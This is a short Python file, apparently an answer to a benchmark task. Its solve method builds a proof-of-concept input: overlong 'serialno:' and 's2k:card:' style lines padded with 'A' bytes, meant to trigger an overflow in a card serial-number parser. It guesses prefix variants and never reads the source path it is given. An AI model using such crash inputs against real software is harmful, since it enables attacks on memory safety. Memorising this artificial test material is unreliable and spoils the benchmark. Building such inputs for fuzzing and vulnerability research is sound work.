import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        payload_lines = []
        long_value = b"A" * 96

        prefixes = [
            b"Serialno:",
            b"serialno:",
            b"SERIALNO:",
            b"s2k:card:",
            b"S2K:card:",
            b"S2K:CARD:",
            b"card:",
            b"Card:",
            b"CARD:",
            b"s2k-card:",
            b"S2K-CARD:",
            b"serial:",
            b"Serial:",
            b"SERIAL:",
        ]

        for p in prefixes:
            payload_lines.append(p + long_value + b"\n")

        # Include some variants with spaces and equals which might be expected by different parsers
        alt_prefixes = [
            b"Serialno = ",
            b"serialno = ",
            b"SerialNo = ",
            b"serialno: ",
            b"Serialno: ",
            b"card = ",
            b"card serialno: ",
            b"s2k: card: ",
            b"S2K: card: ",
        ]

        for p in alt_prefixes:
            payload_lines.append(p + long_value + b"\n")

        # Provide a minimal short candidate close to the ground-truth length (27 bytes)
        # in case the parser only processes the first line or expects a short token.
        # "serialno:" (9) + 18 'A' = 27
        payload_lines.insert(0, b"serialno:" + b"A" * 18)

        return b"".join(payload_lines)